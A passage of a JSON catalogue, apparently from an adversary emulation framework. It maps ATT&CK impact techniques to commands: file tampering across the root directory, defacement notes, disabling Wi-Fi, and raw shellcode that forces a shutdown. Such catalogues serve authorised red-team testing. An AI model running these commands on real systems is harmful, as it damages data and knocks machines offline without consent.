         "technique_name": "Data Manipulation: Stored Data Manipulation",
         "tactic": "impact",
         "description": "Hunts for files of a certain extension and inserts a message",
         "command": "./mission.go -duration 60 -extension .caldera -dir '/'"
      }
   ],
   "T1491": [
      {
         "technique_id": "T1491",
         "technique_name": "Defacement",
         "tactic": "impact",
         "description": "Create a text file for the user to find",
         "command": "echo \"proof that this machine was hacked.\" > message.txt\n"
      },
      {
         "technique_id": "T1491",
         "technique_name": "Defacement",
         "tactic": "impact",
         "description": "Downloads random meme and sets as desktop background",
         "command": ".\\Invoke-MemeKatz.ps1\n"
      }
   ],
   "T1499": [
      {
         "technique_id": "T1499",
         "technique_name": "Endpoint Denial of Service",
         "tactic": "impact",
         "description": "Turn a computers WIFI off",
         "command": "./wifi.sh off\n"
      },
      {
         "technique_id": "T1499",
         "technique_name": "Endpoint Denial of Service",
         "tactic": "impact",
         "description": "Force shutdown a target system using Process Injection and raw shellcode",
         "command": "0x48, 0x31, 0xc0, 0x48, 0x31, 0xd2, 0x50, 0x6a, 0x77, 0x66, 0x68, 0x6e, 0x6f, 0x48, 0x89, 0xe3, 0x50, 0x66, 0x68, 0x2d, 0x68, 0x48, 0x89, 0xe1, 0x50, 0x49, 0xb8, 0x2f, 0x73, 0x62, 0x69, 0x6e, 0x2f, 0x2f, 0x2f, 0x49, 0xba, 0x73, 0x68, 0x75, 0x74, 0x64, 0x6f, 0x77, 0x6e, 0x41, 0x52, 0x41, 0x50, 0x48, 0x89, 0xe7, 0x52, 0x53, 0x51, 0x57, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc0, 0x3b, 0x0f, 0x05\n"
      }
   ]
}